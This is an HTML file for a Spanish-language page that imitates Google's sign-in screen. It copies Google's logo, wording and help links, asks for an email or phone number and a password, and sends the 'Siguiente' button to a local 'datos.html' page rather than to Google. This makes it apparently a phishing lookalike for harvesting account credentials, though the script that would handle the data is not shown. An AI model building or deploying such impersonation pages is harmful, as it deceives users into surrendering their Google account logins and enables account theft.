<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión - Google</title>
<link rel="stylesheet" href="assets/styles/stylesin.css">
</head>
<body>
<div class="container">
  <div class="logo">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
  </div>
  <h1>Acceder</h1>
  <p>Usa tu Cuenta de Google</p>
  <form>
    <div class="form-group">
      <label for="email">Correo electrónico o teléfono</label>
      <input type="email" id="email" name="email" placeholder="Correo electrónico o teléfono" required>
    </div>
    <div class="form-group">
        <label for="Contraseña">Contraseña</label>
        <input type="Contraseña" id="Contraseña" name="Contraseña" placeholder="Contraseña" required>
      </div>
    <div class="form-group">
      <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Des_419%26utm_source%3DOGB%26utm_medium%3Dact&ddm=0&dsh=S738851885%3A1719783053430060&ec=GAlAwAE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=es_419&service=accountsettings&authuser=0">¿Olvidaste el correo electrónico?</a>
    </div>
    <div class="form-group">
      <p>¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.</p>
      <a href="https://support.google.com/chrome/answer/6130773?hl=es-419">Más información para usar el modo de invitado</a>
    </div>
    <div class="buttons">
      <button type="submit" onclick="redirectTo('pages/datos.html')">Siguiente</button>
      <button type="button" onclick="redirectTo('https://accounts.google.com/lifecycle/steps/signup/name?continue=https://myaccount.google.com/?hl%3Des_419%26utm_source%3DOGB%26utm_medium%3Dact&ddm=0&dsh=S738851885:1719783053430060&ec=GAlAwAE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=es_419&service=accountsettings&TL=AC3PFD73wfua183z71VipIBBuRCGEIFNl4Z4F-GxsgN9gyndtQBspmxc_YCC2Q7D')">Crear cuenta</button>
    </div>
  </form>
  <div class="footer">
    <a href="https://support.google.com/accounts?hl=es-419&p=account_iph">Ayuda</a>
    <a href="https://accounts.google.com/TOS?loc=MX&hl=es-419&privacy=true">Privacidad</a>
    <a href="https://accounts.google.com/TOS?loc=MX&hl=es-419">Condiciones</a>
  </div>
</div>
<script src="assets/scripts/main.js"></script>
</body>
</html>
